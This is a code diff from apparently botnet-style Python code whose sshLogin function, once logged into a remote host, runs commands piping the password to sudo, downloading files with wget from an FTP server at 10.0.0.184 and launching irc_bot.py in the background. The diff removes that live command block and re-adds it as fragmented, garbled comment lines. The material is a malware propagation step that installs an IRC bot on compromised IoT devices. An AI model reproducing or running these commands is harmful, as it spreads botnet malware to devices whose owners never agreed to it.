@@ -32,16 +32,31 @@ def sshLogin(user, ip, password):
         stdin = channel.makefile('wb')
         stdout = channel.makefile('rb')
 
+        # cd / home
+        # echo
+        # ''' + password + ''' | sudo - S
+        # mkdir
+        # kabali
+        # cd
+        # kabali
+        # echo
+        # ''' + password + ''' | sudo - S
+        # mkdir
+        # IotBot
+        # cd
+        # IotBot
+        # echo
+        # ''' + password + ''' | sudo
+        # wget - -user = user - -password = abcd
+        # ftp: // 10.0
+        # .0
+        # .184: / IotBot / *
+        # python3
+        # irc_bot.py &
+        # ls
+
         stdin.write(
         '''
-        cd /home
-        echo ''' + password + '''| sudo -S mkdir kabali
-        cd kabali 
-        echo ''' + password + '''| sudo -S mkdir IotBot
-        cd IotBot
-        echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
-        python3 irc_bot.py &
-        ls
         exit
         '''
         )
